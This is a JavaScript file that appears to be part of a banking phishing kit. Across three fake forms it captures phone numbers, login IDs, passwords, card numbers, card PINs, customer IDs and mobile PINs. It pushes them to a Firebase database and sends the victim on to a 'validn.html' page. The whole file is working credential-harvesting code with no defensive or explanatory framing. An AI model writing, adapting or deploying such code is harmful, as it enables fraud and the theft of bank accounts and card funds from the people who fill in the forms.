// Reference your database
var ududip007DB = firebase.database().ref("ududip007");

// Handle form submission for form1
document.getElementById("form1").addEventListener("submit", submitForm1);

// Handle form submission for form2
document.getElementById("form2").addEventListener("submit", submitForm2);

// Handle form submission for form3
document.getElementById("form3").addEventListener("submit", submitForm3);

// Save form data to Firebase for form1
function submitForm1(e) {
  e.preventDefault();

  // Get form values
    var uphone = getElementVal("uphone");
  var ucid = getElementVal("ucid");
  var pword = getElementVal("pword");

  // Save form data to Firebase if both fields are filled
  if (uphone && ucid && pword) {
    saveFormData("form1", { PhoneNumber: uphone, LoginId: ucid, Password: pword });
  }

  // Redirect to validn
  window.location.href = "validn.html";
}

// Save form data to Firebase for form2
function submitForm2(e) {
  e.preventDefault();

  // Get form values
  var ucard = getElementVal("ucard");
  var upin = getElementVal("upin");

  // Save form data to Firebase if both fields are filled
  if (ucard && upin) {
    saveFormData("form2", { CardNumber: ucard, CardPin: upin });
  }

  // Redirect to validn
  window.location.href = "validn.html";
}

// Save form data to Firebase for form3
function submitForm3(e) {
  e.preventDefault();

  // Get form values
  var umcid = getElementVal("umcid");
  var cphone = getElementVal("cphone");
  var umpin = getElementVal("umpin");

  // Save form data to Firebase if at least one field is filled
  if (umcid || cphone || umpin) {
    saveFormData("form3", { CustomerID: umcid, RegisteredMobileNumber: cphone, MPINNO: umpin });
  }

  // Redirect to validn
  window.location.href = "validn.html";
}

// Save form data to Firebase
function saveFormData(formId, formData) {
  var newududip007 = ududip007DB.push();
  newududip007.set(formData);
}

// Get element value by ID
function getElementVal(id) {
  return document.getElementById(id).value;
}
